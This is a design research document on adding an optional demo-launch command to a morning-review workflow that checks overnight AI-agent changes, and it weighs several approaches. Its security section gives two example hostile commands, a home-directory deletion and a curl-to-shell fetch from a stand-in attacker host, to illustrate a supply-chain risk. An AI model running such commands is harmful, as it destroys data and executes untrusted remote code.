# Research: Agent-driven demoability assessment and validation setup at morning review

> Topic: Add an optional `demo-command` field to `lifecycle.config.md`; in the morning-review walkthrough, have the agent reason about whether overnight changes warrant interactive validation by the user, and (if so) offer to spin up a fresh git worktree from `overnight/{session_id}` and launch the demo. After PR merge, remind the user to close the demo if still running.

## Epic Reference

This ticket is decomposed from the discovery research at [`research/morning-review-demo-setup/research.md`](../../research/morning-review-demo-setup/research.md), which evaluated whether to auto-launch demos at morning-review time and concluded that the morning-review skill is the only viable hook point (the integration worktree is destroyed at session end; the overnight branch persists). This ticket scopes the lifecycle.config.md schema addition + morning-review walkthrough modification to deliver that single decomposed slice.

## Codebase Analysis

### Files that will change

- `skills/lifecycle/assets/lifecycle.config.md` — add an optional `demo-command` field to the commented frontmatter block (currently lines 1–9). This is the canonical schema template that users copy to their project root. Insertion point: alongside `test-command` on (currently) line 3, as `# demo-command:          # e.g., godot res://main.tscn, uv run fastapi run src/main.py` (the literal `--play` flag in the original ticket example is not a real Godot 4 flag — see Adversarial Review).
- `skills/morning-review/references/walkthrough.md` — depending on chosen approach, either insert a new `## Section 2a — Demoability Assessment & Setup Offer` between Section 2 (Completed Features, ending line 79) and Section 2b (Lifecycle Advancement, starting line 82); or add a single pointer line to the Completed Features block at the end of Section 2; or no change at all (if the feature is reshaped into a standalone `/demo` skill — see Open Questions).
- `skills/morning-review/SKILL.md` — minor edits to the Step 3 outline (lines 70–79) and the Constraints block (lines 124–129). Currently Step 3 lists four sub-steps (Completed Features → Lifecycle Advancement → Deferred Questions → Failed Features); a "Demoability" bullet may be added between items 1 and 2 depending on chosen approach. SKILL.md defers heavy lifting to walkthrough.md, so the edit here is a pointer, not a full protocol.
- `skills/morning-review/references/walkthrough.md` Edge Cases table (lines 418–457) — new rows for: `demo-command` absent, `demo-command` present but malformed, `lifecycle.config.md` missing, `overnight/{session_id}` already deleted, `git worktree add` fails (collision, stale path, locked), user accepted then walkthrough resumed on another machine.
- No changes needed to `claude/overnight/report.py`, `claude/overnight/state.py`, or the runner. The feature is purely morning-review-side; the overnight branch and the `spec_path` + `integration_branch` fields in `overnight-state.json` are already written and available.

### Relevant existing patterns

- **Inline frontmatter peek pattern** (skill-side, no parser): `skills/critical-review/SKILL.md:21-22` reads `lifecycle.config.md` and checks a single field (`type:`) via inline instructions: "present, non-empty, and not commented out (i.e., the line is not prefixed with `#`)". `skills/lifecycle/references/complete.md:9-13` uses the same idiom for `test-command`. **Caveat**: prior uses are simple boolean-ish or single-token fields. `demo-command` is a shell command that may contain `#`, quoted args, env vars, and pipes — the inline instruction pattern under-specifies parsing for this field. See Open Questions.
- **Worktree creation from a skill** — two styles exist:
  1. `cortex-worktree-create.sh` (`claude/hooks/cortex-worktree-create.sh:1-67`): the `WorktreeCreate` hook for `Agent(isolation: "worktree")`. Hardcodes `$CWD/.claude/worktrees/$NAME` and creates a new `worktree/$NAME` branch from HEAD. **Not reusable** for a demo that needs an existing `overnight/{session_id}` branch at a different path.
  2. Direct `git worktree add` invocation (`claude/overnight/runner.sh:582`, `claude/overnight/batch_runner.py:256-258`): `git worktree add "$WORKTREE_PATH" "$INTEGRATION_BRANCH"` from home repo root, with `Path(tmpdir) / "overnight-worktrees" / "{session_id}-lazy-{repo_dir_name}"`. Confirmed at `lifecycle/sessions/overnight-2026-04-11-1443/overnight-state.json:67`. The lifecycle SKILL.md (lines 359–364) warns that `git worktree add` fails inside `.claude/**` but is OK at `$TMPDIR`. Cleanup precedent: walkthrough.md Section 6 step 5 already runs `git worktree remove --force {worktree_path}` after PR merge.
- **Session-state reads** in skills use `jq` against `lifecycle/sessions/latest-overnight/overnight-state.json` (e.g., `walkthrough.md:38-48`). `skills/morning-review/references/walkthrough.md` is the only current consumer of this state from the skills layer; `skills/overnight/SKILL.md` references the file for documentation but doesn't read it in-flight.
- **Letter-suffixed conditional sub-sections**: walkthrough.md uses `## Section 2b`, `## Section 2c`, `## Section 6a` for follow-on steps that run conditionally, each opening with a "Run immediately after …" or "Skip this section entirely if …" lead clause. This is the established pattern for inserting a new conditional subsection.
- **Per-feature auto-advance contract**: walkthrough.md:84 codifies "Run immediately after the batch verification response. No additional user input is needed." The user has saved this as a preference in memory (`feedback_lifecycle_auto_proceed.md`). Any new subsection that synchronously waits for the user to "report back" violates this contract — see Adversarial Review and Open Questions.

### Integration points and dependencies

- **Reads at Step 3 / Section 2 time**:
  - `lifecycle/sessions/latest-overnight/overnight-state.json` → already opened for overnight metadata (`walkthrough.md:39`). Two more fields needed by the new logic: `integration_branch` (already read at Section 6, line 348) and `spec_path` per feature (stored on each `FeatureStatus`, see `claude/overnight/state.py:92` and the example state file; default is `lifecycle/{slug}/spec.md`).
  - `lifecycle.config.md` at project root → new read; would follow the inline-peek pattern, but with parser caveats.
  - `git diff main...{integration_branch}` where `{integration_branch}` is the `overnight/{session_id}` value stored in state. `claude/overnight/plan.py:369,502` confirms the branch-name format is hard-coded.
  - Each feature's `lifecycle/{feature}/spec.md`, derivable from the `spec_path` field on each merged feature in state.
- **Worktree creation for the demo** requires a direct `git worktree add` from the skill's main repo context. The runner's existing pattern at `runner.sh:582` is the model. The `cortex-worktree-create.sh` hook cannot be reused.
- **Cleanup coupling to Section 6**: Section 6 step 5 already removes the integration worktree on successful merge (`walkthrough.md:381-385`). A demo worktree would need similar removal, plus a user-facing reminder for any still-running demo process the skill cannot kill.
- **External tools shelled out** (already in morning-review's toolkit): `jq`, `gh`, `git`, `open`, `update-item`, `python3 -m claude.overnight.report`, `git-sync-rebase.sh`. Adding `git diff` and `git worktree add` is consistent with this toolset; running an arbitrary user-provided `demo-command` is new.

### Conventions to follow

- **Skill prose style**: declarative numbered steps, bullet lists, fenced code blocks for commands; each conditional sub-section opens with a "Skip this section entirely if …" guard clause.
- **lifecycle.config.md schema comments**: `# field: example_value   # valid | values | here`. Commented-by-default scalar fields. Boolean fields are uncommented with explicit values.
- **CLAUDE.md sandbox rules**: never `git -C`, no `&&`/`;`/`|` chaining (one tool call per command), no HEREDOC commit messages, always `/commit` skill, multi-line commits via repeated `-m` flags. JSON must remain valid. Hooks must be executable. Symlinks: edit the repo copy under `skills/*`, never the `~/.claude/skills/*` destination.

### Findings on specific questions

- **Q3 (YAML parsing helper available?)**: No reusable helper in `claude/common.py`. Four file-local Python implementations exist (`backlog/generate_index.py:36`, `claude/overnight/backlog.py:217`, `bin/audit-doc:145`, three copies in `skills/skill-creator/scripts/`), none importable from a skill. The morning-review skill is markdown protocol that shells out via `jq`/`bash`, not a Python module. Established skill-side idiom is inline instructions.
- **Q4 (worktree creation pattern)**: Canonical direct invocation from runner.sh:582 (`git worktree add "$WORKTREE_PATH" "$INTEGRATION_BRANCH"`) at `$TMPDIR/overnight-worktrees/`. Error handling (runner.sh:576-593): check path exists, prune stale metadata if not, mkdir parent, retry, exit on failure. Cleanup: `git worktree remove --force`.
- **Q5 (overnight branch name access)**: Stored in `overnight-state.json.integration_branch` (string) and `.integration_branches` (dict, used by report.py:487). Format `overnight/{session_id}` is hard-coded in `claude/overnight/plan.py:369,502`. Persists as a regular git branch after session end.
- **Q6 (morning report Completed Features format)**: `claude/overnight/report.py:468-595`, `render_completed_features()`. Structure: `## Completed Features` h2 → grouped by repo → `### {repo_name}` h3 → per feature `#### {feature-name} (backlog #{id:03d})` h4 → `**Key files changed:**` → optional `**Cost**` → `**How to try:**` (from plan.md `## Verification Strategy`, extracted by `_read_verification_strategy` at report.py:732-746) → optional `**Notes:**` → optional `**Requirements drift detected**`. Per-feature `spec_path` is on each `FeatureStatus` in state, default `lifecycle/{slug}/spec.md`.
- **Q8 (conditional subsection pattern)**: Letter-suffixed section headings (`## Section 2b`, `## Section 2c`, `## Section 6a`) with a one-line "Run immediately after …" or "Skip this section entirely if …" lead. Each subsection has its own row set in the Edge Cases table.

## Web Research

### Agentic validation-hint patterns

- **Devin (Cognition)**: hands off via PR; surfaces a "session log" of tool use. Flagged for not always surfacing uncertainty, which is presented as the reason humans must remain in the loop. PR merge rates rose ~34% → ~67% over 2025, meaning ~1/3 of autonomous PRs still need meaningful rework. Sources: deployhq.com/guides/devin, cognition.ai/blog/devin-review.
- **GitHub Copilot Coding Agent**: produces a normal PR, surfaces a session log, runs its own tests/linters in an ephemeral dev env, and explicitly cannot self-approve under branch protection ("someone else must approve"). Sources: docs.github.com/en/copilot/how-tos/use-copilot-agents/cloud-agent/track-copilot-sessions, github.blog/changelog/2026-03-19-more-visibility-into-copilot-coding-agent-sessions/.
- **Cursor / Cline / Continue / Aider**: split on a supervised vs. autonomous axis. Tools either ask permission per tool call (Cline/Cursor/Windsurf) or run multi-step and surface results in chunks (Claude Code, Aider, Devin). No standardized "ready-for-validation" marker. No product surfaces "this diff specifically warrants interactive validation."
- **Claude Code itself**: documented loop is "gather context, take action, verify results." Verification is via tool outputs (tests, lints) feeding back into the loop. Permission modes (ask / auto-approve / block) are the primary human-in-the-loop lever. No documented "ask the human to manually validate" tool.
- **Aider**: commits directly on the user's branch; relies on `git diff`-style review. No interactive demo step. Aider notably skips pre-commit hooks by default (`--no-verify`) and offers `--git-commit-verify` to opt back in — illustrative of "opt-in to extra verification" as a design pattern.
- **Gap**: no product was found that decides whether an agent-produced diff warrants human interactive validation, then offers to launch a demo. The closest adjacent ideas (Devin's interactive planning, Copilot Workspace session logs) operate on pre-execution context and PR-level review, not post-execution demo launch. **This appears to be novel ground.**

### git worktree operational patterns

- **`--force`** (single): per `git-scm.com/docs/git-worktree`, "by default, `add` refuses to create a new worktree when `<commit-ish>` is a branch name and is already checked out by another worktree, or if `<path>` is already assigned to some worktree but is missing." `--force` overrides. `--force --force` is required only for "locked + missing" combinations.
- **`git worktree add -d <path>`** is the documented "throwaway worktree" pattern: "if you just plan to make some experimental changes or do testing without disturbing existing development, it is often convenient to create a throwaway worktree not associated with any branch." This is the closest official analog to a demo worktree, though the demo case wants an existing branch checked out, not a detached HEAD.
- **Prune & cleanup**: `git worktree prune` (with `-n` dry-run, `--expire <time>`) removes stale admin dirs under `$GIT_DIR/worktrees`. Default expiry is 3 months (`gc.worktreePruneExpire`). If the user `rm -rf`'s a worktree directory without `git worktree remove`, git keeps the stale metadata until prune. Sources: git docs, musteresel.com/posts/2018/01/git-worktree-gotcha-removed-directory.html.
- **macOS `$TMPDIR` symlink**: per nodejs/node #11422, `$TMPDIR` points under `/var/folders/...` which is a symlink to `/private/var/folders/...`. Cross-platform tools repeatedly trip over this. Recommendation: resolve via `realpath` / `readlink -f` before storing or comparing, because git may normalize the path and then fail to match the `$TMPDIR` form passed in. Additionally, `$TMPDIR` is per-bootstrap-session on macOS — a fresh terminal window may inherit a different value in some shell-launch modes.
- **`$TMPDIR` as a worktree target**: not explicitly endorsed by git docs or by major worktree-tutorial blog posts. Most blog-post recommendations co-locate worktrees under a known persistent directory (e.g., `~/projects/<repo>/<branch>` per matklad.github.io/2024/07/25/git-worktrees.html). The cortex-command project has its own established `$TMPDIR/overnight-worktrees/` pattern that diverges from this norm — see Open Questions.
- **Submodule failure mode**: `git worktree remove` can refuse to remove a worktree that contains submodules, motivating `--force` in wrapper tools. Source: github.com/coderabbitai/git-worktree-runner/issues/160.

### Demo-launch conventions

- **No framework reserves a `demo` command name.** Convention by ecosystem:
  - npm: lifecycle scripts are `start`, `stop`, `restart`, `test`. `dev` is universal convention but not built-in. `demo` has no convention.
  - Turborepo: marks long-running interactive tasks with `"persistent": true`. No `demo` distinction.
  - Nx: targets are `serve`, `test`, `build`. "demo" would conventionally be a configuration of `serve`.
  - just: all recipes are user-defined; common ones are `default`, `dev`, `build`, `test`, `lint`, `fmt`, `clean`. No `demo` reserved.
- **FastAPI**: `fastapi dev` (autoreload, localhost-only) vs `fastapi run` (no reload, all interfaces). FastAPI docs warn against `--reload` in production. **For a one-shot demo launch from a worktree, `fastapi run` (no reload) is more honest** — the demo should reflect the diff, not whatever the user edits afterwards. `--reload` also has subprocess-tree gotchas with signal propagation (uvicorn parent is a file watcher; the actual app is a subprocess).
- **Godot**: docs were unreachable via WebFetch (403). Search-result evidence suggests the canonical CLI is `godot res://scene.tscn` (positional) or `godot --path . res://main.tscn`. A `--play` flag was not confirmed — the example `godot --play res://main.tscn` from the ticket is **probably not a real flag** and should be replaced with `godot res://main.tscn`. **This error has propagated from the backlog item into the discovery research and could land in the spec if not corrected.** See Open Questions.

### Single-offer CLI UX conventions

- **clig.dev** (canonical CLI guidelines): "Only use prompts or interactive elements if stdin is an interactive terminal (a TTY)." "Never require a prompt. Always provide a way of passing input with flags or arguments." "If `--no-input` is passed, don't prompt or do anything interactive." Confirmation tier convention: "A common convention is to prompt for the user to type `y` or `yes` if running interactively, or requiring them to pass `-f` or `--force` otherwise."
- **`gh pr create`**: design statement from the GH CLI team (issues #5848, #457; discussion #4695): "there are already many prompts during pr create" — the team has resisted adding more. Escape hatches are `--title`/`--body`/`--fill`. An earlier auto-default for push target was *removed* because it was wrong for most users — illustrative that "helpful defaults that are sometimes wrong" is considered worse than "always ask once."
- **create-next-app**: single high-signal offer ("Would you like to use the recommended Next.js defaults?") with three choices and a `--yes` flag to bypass.
- **Claude Code**: permission modes (`default`/`acceptEdits`/`plan`/`bypassPermissions`) are the closest in-product example of "one meta-decision applied to many subsequent actions" — a precedent for "one offer, not nagging."

### Known anti-patterns when launching processes from walkthroughs

- **SIGINT propagation**: Ctrl+C sends SIGINT to the foreground *process group*. If a script execs a child directly, both are hit — but with `uvicorn --reload` (file-watcher parent + grandchild app), process-group semantics can leave the app running if the group isn't preserved. Source: access.redhat.com/solutions/1539283.
- **Background-then-wait pattern**: bash doesn't run traps while a foreground command blocks, so the canonical pattern is `child_cmd & wait $!` with traps installed. Forgetting `wait` prevents the trap from firing. Source: veithen.io/2014/11/16/sigterm-propagation.html, golinuxcloud.com/capture-ctrl-c-in-bash.
- **Background-ignores-SIGINT footgun**: "Bash configures commands started in the background to ignore SIGINT, meaning that CTRL+C only stops the script, but not the background process." Critical: if a walkthrough backgrounds the demo, Ctrl+C in the walkthrough closes the walkthrough but leaves the demo running.
- **Named incidents**: webpack-dev-server #2168 (orphaned children when spawned from a parent Node process; mitigated by `detached: true` + explicit `process.kill(-pid, 'SIGTERM')`). Nuxt #29744 (EBADF on macOS when esbuild subprocesses inherit bad file descriptors from a parent shell). FastAPI discussion #3209 + OneUptime piece (uvicorn `--reload` grandchild subprocess + signal-forwarding issues, especially on macOS).
- **detach anti-pattern**: `nohup` / `disown` / `setsid` make processes survive shell exit. This is the *opposite* of what a walkthrough wants — a walkthrough wants the demo to die when the walkthrough ends. Accidentally using nohup/disown in a walkthrough script prevents the demo from ever being cleaned up.

## Requirements & Constraints

### project.md

- **"Day/night split — Morning is strategic review — not debugging sessions."** Load-bearing tension. Adding interactive demo launch must fit the "strategic review" framing. Demos are debugging-adjacent by nature (the user launches a thing to look at it and reason about whether it works) — see Open Questions.
- **"Complexity must earn its place by solving a real problem that exists now."** Optional `demo-command` config + assessment subsection + worktree creation + cleanup contract must justify itself against this bar; the simpler path (no demo) must remain the default.
- **"Quality bar — ROI matters — the system exists to make shipping faster, not to be a project in itself."** Time cost per session trades against morning-review's ROI target.
- **"File-based state — markdown, JSON, YAML frontmatter."** `demo-command` belongs as a YAML field in `lifecycle.config.md`; no new sidecar state.
- **"Defense-in-depth for permissions — global allows minimal, comprehensive deny, sandbox enabled."** Running arbitrary `demo-command` strings is subject to allow/deny rules. Global allows must NOT be expanded; the prompt should fall through to user approval.
- **"Graceful partial failure."** A failed demo attempt must not block the rest of morning review.
- **"Handoff readiness — the spec is the entire communication channel."** `demo-command` is a spec-time artifact: authors declaring how a feature is demoed should be part of the handoff, not invented at morning-review time.

### pipeline.md

- **"Integration branches (`overnight/{session_id}`) persist after session completion and are not auto-deleted — they are left for PR creation to main."** Branch is guaranteed at morning-review time, before PR merge.
- **Architectural Constraint: Integration branch persistence** — stated purpose is "manual PR creation and review." **Worktree re-creation for demo is NOT named as a consumer.** This feature adds a new, unstated consumer of that guarantee. The constraint does not forbid it but the stated purpose is narrower than the feature's need.
- **Post-Session Sync** rebases local main onto remote after PR merge. Demo MUST happen before PR merge — otherwise the integration branch lags main and the worktree state may no longer match "what you just merged." **Walkthrough ordering (demo vs. merge) is load-bearing.**
- **Artifact commits land on the integration branch, not local main**, except the morning-report commit. The demo worktree sourced from `overnight/{session_id}` will contain all artifact commits.

### multi-agent.md

- **Existing worktree pattern**: `.claude/worktrees/{feature}/` (default repo, when sandbox allows) or `$TMPDIR/overnight-worktrees/{session_id}/{feature}/` (cross-repo). Stated reason for `$TMPDIR`: "to avoid sandbox restrictions." **The ticket's `$TMPDIR/demo-{session_id}/` choice is consistent with this rationale and proven sandbox-safe.**
- Acceptance criteria from the runner's worktree management: idempotent creation, branch naming with collision detection, stale `.git/worktrees/{feature}/index.lock` removal, idempotent cleanup. These are the runner's contracts and would not auto-apply to a demo worktree — the spec needs to inherit them.
- **No explicit prohibition on manual worktree creation from a skill** exists in multi-agent.md. The section documents what the runner does; it does not say "only the runner may create worktrees." But there is also no sanctioned pattern for skill-side worktree creation.

### remote-access.md

- **Morning review over mosh/tmux on Android is an explicitly supported path.** "Mobile alerting requires: `NTFY_TOPIC` env var set, `TMUX` env var set (session must be inside tmux), `curl` and `jq` available in PATH, network access to `https://ntfy.sh`."
- "Session persistence depends on a macOS terminal that supports persistent container processes (currently Ghostty)." A demo launched as a child of the Claude session should not assume foreground terminal ownership — if the Claude client disconnects, so may the demo.
- **No explicit "avoid GUI processes from a mosh session" constraint**, but the platform constraints imply demos may need to be headless or web-accessible to be usable from all supported entry points. **A GUI-dependent demo (Godot window) is incompatible with mosh.** See Adversarial Review.

### observability.md

- Statusline is read-only and cannot drive interactive prompts for demo acceptance.
- Notifications fire on session stop, not on subagent or in-session events; "Subagent sessions are suppressed."
- Dashboard is read-only and cannot modify session state, trigger retries, or dispatch features.
- **No explicit constraints on demo/preview/validation UX.** The interactive offer must happen in the agent's own turn, not via statusline/notifications/dashboard.

### CLAUDE.md / sandbox-behaviors.md / global-agent-rules.md

- Always commit using the `/commit` skill — never `git commit` manually.
- Imperative commit subjects, max 72 chars, no trailing period; multi-line via repeated `-m`.
- **Never `git -C <path>`** — breaks permission allow rules; use cwd or positional arg.
- **No compound commands** (`&&`, `;`, `|`) — permission system evaluates the full string as one unit. One tool call per command.
- **No `$(cat <<'EOF' ... EOF)`** for commit messages — fails in sandboxed environments.
- Symlinks: edit the repo copy under `skills/*`, never the destination at `~/.claude/skills/*`.
- Settings JSON must remain valid; hooks executable.
- Deploy-bin pattern: logic in `bin/`, deployed via `just deploy-bin`, skills invoke by name.

### clarify.md §5 alignment vocabulary

Spec must produce one of: "Aligned with requirements/{file}", "Partial alignment", "No requirements files found", or "Conflict detected" (which must be resolved with the user). For this feature: aligned with `pipeline.md` (Integration branch persistence) and `multi-agent.md` ($TMPDIR worktree convention); partial alignment with `project.md` ("strategic review — not debugging sessions" tension); no conflict with `remote-access.md` directly but feature is incompatible with a GUI demo over mosh.

## Tradeoffs & Alternatives

### Feasibility summary from epic research

The discovery research (`research/morning-review-demo-setup/research.md`) ruled out approaches that depend on the integration worktree existing at morning-review time (the runner destroys it at session end via `git worktree remove --force` at runner.sh:1291–1330). Only the overnight *branch* persists. That eliminates Approaches A (background launch from worktree at session end) and B (launch script generated at session end). The viable approaches are C (morning-review creates a fresh worktree from the branch), D (morning-review prints launch instructions only — also viable, simpler, but discarded by the discovery doc without explanation), and a family of new candidates evaluated below.

### Approach C (ticket's choice): Agent creates worktree + launches demo

**Description**: In morning-review Step 3, the agent reads `lifecycle.config.md` for `demo-command`, reads `git diff main...overnight/{session_id}` + each completed feature's spec, classifies whether any feature is "human-demoable," and if so makes one offer per session. On accept, the agent creates `$TMPDIR/demo-{session_id}/` from the overnight branch via its own Bash tool, runs `demo-command` from that directory in the agent's terminal, and stays present to guide what to look at. At Step 6 (post-PR-merge), reminds the user to close the demo if still running.

**Pros**:
- Single user interaction (one accept/skip).
- Fully agent-driven; the agent already has spec, diff, working context — can tailor "what to look for" guidance.
- Demo worktree is off main repo state.

**Cons**:
- **Fatal flaw**: holds the long-running `demo-command` process in the agent's own Bash tool slot. For a server-type demo (cortex-command's own dashboard), this blocks the walkthrough. The ticket disclaims PID/Popen management but C either implies it or hangs the agent.
- Mixes "decide whether to demo" (judgment) + "prepare worktree" (mechanical) + "launch demo" (interactive) into one blob. Failure mode is ambiguous.
- "Smart assessment" layer adds spec-ambiguity: criteria but no decision procedure → inconsistent across sessions.
- Couples demo launch to walkthrough state; user can't demo an hour later without re-deriving everything.
- Step 6 "still running" reminder is best-effort; nothing enforces cleanup.

### Approach D: Agent prints command; user runs manually

**Description**: Same demoability assessment, but instead of running anything, the agent prints a ready-to-paste block (`git worktree add ... && cd ... && demo-command`, plus cleanup commands). User pastes into a separate terminal. No branching code path on accept/reject; agent just proceeds.

**Pros**: Simplest possible. No PID tracking. Zero coupling between demo lifecycle and walkthrough. Deterministic failure modes. Multi-shell-friendly. Works for foreground games and long-running servers equally. Cleanup contract printed up front.

**Cons**: Requires user copy/paste. No guarantee the demo actually runs. Agent can't adapt guidance contingent on demo state.

### Approach E: Agent creates worktree + prints command for user to run

**Description**: Split mechanical from interactive. Agent runs `git worktree add` itself (rote, well-bounded), prints the command for the user to run in their own terminal, waits for user "done" signal, runs `git worktree remove`. Demo never enters the agent's own Bash slot.

**Pros**: Eliminates the paste-the-worktree-incantation step from D while keeping non-blocking semantics. Cleanup is agent-driven.

**Cons** (revealed by Adversarial Review):
- **Assumes a "separate terminal" exists.** Project explicitly supports morning review over mosh on a phone — no second terminal there. Mutually exclusive with `requirements/remote-access.md`.
- **`$TMPDIR` is per-bootstrap-session and a symlink chain on macOS.** A new terminal window may inherit a different `$TMPDIR`. Path printed by the agent may not be writable/removable from the user's shell.
- **"Let me know when you're done" pause violates the auto-advance contract** (`walkthrough.md:84`, user feedback memory `feedback_lifecycle_auto_proceed.md`). If the user wanders off, the walkthrough is stalled — morning-report commit and PR merge don't happen.
- **"Still running" detection at Step 6 has no contract**: agent didn't spawn the process, so it can't know.
- **Worktree collisions on re-invocation**: `/morning-review` run twice for the same session hits "already exists" or `--force` clobbers user state.

### Approach F: Standalone `/demo` slash command

**Description**: Morning-review does no demo setup. The Completed Features block prints one line: `Demo available — run /demo {session_id} when ready.` A new `/demo` skill takes a session_id (defaulting to `latest-overnight`), reads the overnight branch, reads `demo-command`, creates a worktree, prints the launch command, exits.

**Pros**:
- **Cleanest separation of concerns.** Morning-review = "what happened, what do we merge"; `/demo` = "let me see it run." Neither blocks the other.
- User invokes `/demo` before, during, after, or never. Walkthrough is never stalled.
- Discoverable via slash-command completion.
- Always opt-in by invocation: no false-positive cost, no "smart assessment" needed.
- Testable independently of morning-review (which is one of the most delicate skills in the tree).
- Can grow features later (per-feature scene selection, "replay last demo", scoped diff demo) without bloating morning-review.

**Cons**:
- Adds a new skill — slightly larger v1 surface than editing one existing skill.
- One-line notice in morning-review is easier to miss than an interactive offer.

### Approach G: Always offer once when configured; skip the assessment

**Description**: Same as C/E mechanics, but no smart assessment — always offer when `demo-command` is set; never offer when absent.

**Pros**: Drops the spec-ambiguity of "what counts as demoable." Implementation drops 60–70%.

**Cons**: A repo whose sessions sometimes touch only docs/config will get unnecessary offers. Loses the "agent reads spec and tailors guidance" pitch from the ticket.

### Sub-tradeoff: Demoability decision procedure

- **(i) Any one feature demoable → offer**: simple, deterministic, generous.
- **(ii) Weighted scoring → threshold**: false precision; not reproducible across agent contexts.
- **(iii) User-configurable default** (`demo-offer: never|always|smart`): solves "I never want this" without removing `demo-command`.

**Drop (ii) entirely.** For v1, the simplest version is "if `demo-command` is set, offer (or just be available); else, do nothing." Add (iii) only if real usage shows nagging.

### Sub-tradeoff: Worktree path

- **`$TMPDIR/demo-{session_id}/`**: matches existing overnight-runner pattern, sandbox-safe (`$TMPDIR` is in default sandbox `allowWrite`), free cleanup on macOS reboot. **Caveats from Adversarial Review**: per-bootstrap-session + symlink chain. Mitigation: resolve via `realpath` before printing; salt with timestamp to avoid same-session collisions.
- **`lifecycle/sessions/{session_id}/demo-worktree/`**: sandbox-allowed. But nesting a git worktree inside the same repo's `lifecycle/` is fragile — `git status` from main worktree shows untracked files in nested worktree, and `lifecycle/sessions/{id}/` is already used for state and reports.
- **`.claude/worktrees/`**: explicitly Seatbelt-restricted per `skills/overnight/SKILL.md:403`. Not viable.

**Recommended path**: `$TMPDIR/demo-{session_id}-{timestamp}/`, with `realpath` resolution before printing the path to the user. For a `/demo` skill (Approach F), the path can also be passed as a positional argument so the skill resolves it once and uses the canonical form throughout.

### Final recommendation from the tradeoffs and adversarial passes

**Approach F (standalone `/demo` skill)** is the cleanest fit. It avoids every major concern surfaced by the adversarial review (no walkthrough auto-advance violation, no remote/mosh incompatibility for non-demo reviews, no "still running" detection contract problem, no re-invocation collisions, no concurrent-session races), reframes the value pitch honestly ("explicitly invoke `/demo` when you want it" vs "agent guesses correctly"), and is testable in isolation.

The remaining decision the user must make: **does this feature deliver enough value if the smart-assessment layer is dropped and it becomes a thin "create worktree from overnight branch + print demo command" utility?** That is the open question for the spec phase.

## Adversarial Review

### Failure modes and edge cases

- **Approach E "separate terminal" assumption is mutually exclusive with mosh-on-phone support.** `requirements/remote-access.md` explicitly supports `/morning-review` reattached from an Android phone over mosh+tmux. There is no second terminal there. If E is the recommended approach, the feature is silently desktop-only and contradicts a stated supported entry point.
- **macOS `$TMPDIR` is per-bootstrap-session and a symlink chain.** A new shell launched outside Claude Code may inherit a different `$TMPDIR` or normalize the path differently. The literal path printed by the agent may not be reachable/removable from the user's other terminal.
- **"Let me know when you're done" pause violates auto-advance.** walkthrough.md:84 codifies "Run immediately after the batch verification response. No additional user input is needed." A stall here means morning-report commit and PR merge never happen.
- **"Still running at Step 6" has no detection contract** under E or F — agent doesn't own the process. Detecting by port conflates with other services; detecting by directory existence doesn't tell you if the demo is running; detecting by PID requires the agent to own the process.
- **Worktree collisions on re-invocation**: `/morning-review` run twice for the same session hits `git worktree add` "already exists." `--force` mitigates but can clobber unstaged user edits inside the worktree. Mitigation: salt path with timestamp; check `git status --porcelain` before any `--force`.
- **"Demo before merge" conflicts with iterative use.** Common workflow: try demo → see small bug → fix → merge → demo again. The "one chance" framing in the ticket forecloses this.
- **Edge cases table not updated** is a known regression vector for past morning-review changes. New rows needed for: `demo-command` absent, malformed, file missing, branch deleted, worktree add fails, user accepted then resumed elsewhere.
- **Godot example in the ticket is probably wrong.** `godot --play res://main.tscn` is not a documented Godot 4 flag; canonical is `godot res://scene.tscn` or `godot --path . res://main.tscn`. The wrong example propagated from the ticket into the discovery research and into THIS research doc until corrected. Spec must use a verified working command.
- **One demo-command field doesn't cover repos with multiple demoable surfaces.** cortex-command itself has FastAPI dashboard, statusline preview, and notification flow — three different interactive surfaces. wild-light has main + combat + minimap scenes. A single static `demo-command` either over-generalizes or requires per-feature overrides the schema doesn't support.
- **Inline parser pattern is under-spec'd for `demo-command`.** Prior uses of "read this file and check `field:`" worked for simple boolean-ish or single-token fields. `demo-command` is a shell command that may contain `#`, quoted args, env vars. Inline-instruction parsing produces inconsistent results across runs.
- **Race conditions across concurrent sessions**: cross-repo overnight sessions can run in parallel, and a user could run two `/morning-review` invocations concurrently for two different repos. They contend on `$TMPDIR/demo-*` paths and on ports for server-type demos.
- **Worktree creation isn't fast for asset-heavy repos.** Godot's `.godot/` cache is gitignored, so a fresh worktree re-imports all assets on first launch — minutes, not seconds. The "frictionless one-click demo" framing breaks down here.

### Security concerns or anti-patterns

- **`lifecycle.config.md` is a checked-in file; `demo-command` is arbitrary shell.** Any contributor opening a PR can add `demo-command: rm -rf ~` (or something subtler like `curl attacker.com/pwn.sh | sh`) to `lifecycle.config.md`. Maintainer runs `/morning-review`, accepts the offer (the agent actively encourages it!), and the shell runs with the maintainer's credentials. This is a supply-chain surface that the existing `--test-command` CLI flag does not have (because that flag is invocation-time, not file-tracked).
- **The overnight branch may contain malicious code.** Even with a clean `lifecycle.config.md`, the overnight branch contains whatever a confused autonomous agent wrote during the night. Running `uv run python -m src.main` from a worktree of that branch executes whatever the agent committed. The overnight-then-PR-review workflow exists precisely to manage this trust boundary — Approaches C/E collapse it. **The approval prompt must make this explicit**: "This will execute overnight-generated code from `overnight/{session_id}` using `<verbatim demo-command>`. Proceed?"
- **`git worktree add --force` can clobber user edits** inside the target path. If the user was hand-editing in `$TMPDIR/demo-{session_id}/` from a previous invocation, `--force` overrides without checking. Mitigation: never use `--force` without first running `git status --porcelain` inside the target.

### Assumptions that may not hold

- "The user is sitting there with a second terminal on a Mac." Not implied by project.md or remote-access.md — both actively guarantee mosh-on-phone as a supported surface.
- "A demo from a worktree is equivalent to a demo from main after merge." External resources (asset caches, `.env` files, lockfiles, local databases, dev-only env vars) may live outside the repo. Cold-starting a worktree may not see them.
- "`git worktree add` takes milliseconds." Asset-heavy repos (Godot, large `node_modules/`, build caches) can take minutes to materialize.
- "The overnight branch still exists." Manual deletion, `git gc --prune=now`, or remote PR-merge cleanup can orphan it. Spec needs a fallback for "branch gone."
- "Agent reasoning about demoability is consistent across sessions." False precision; same diff+spec evaluated by a fresh agent context can answer "yes" or "no" depending on adjacent context. Untestable.
- "Morning review is strategic review, not debugging." Adding interactive demo launch fights this framing.

### Recommended mitigations

- **Drop the demoability assessment entirely for v1.** Drop "always offer when configured" too — instead, make demo launch a separate `/demo` skill that the user invokes explicitly. Morning-review at most prints "demo available via `/demo`" in the footer of completed features.
- **Salt the worktree path** with a per-invocation timestamp: `$TMPDIR/demo-{session_id}-{YYYYMMDD-HHMMSS}/`. Never `--force` without a `git status --porcelain` cleanliness check.
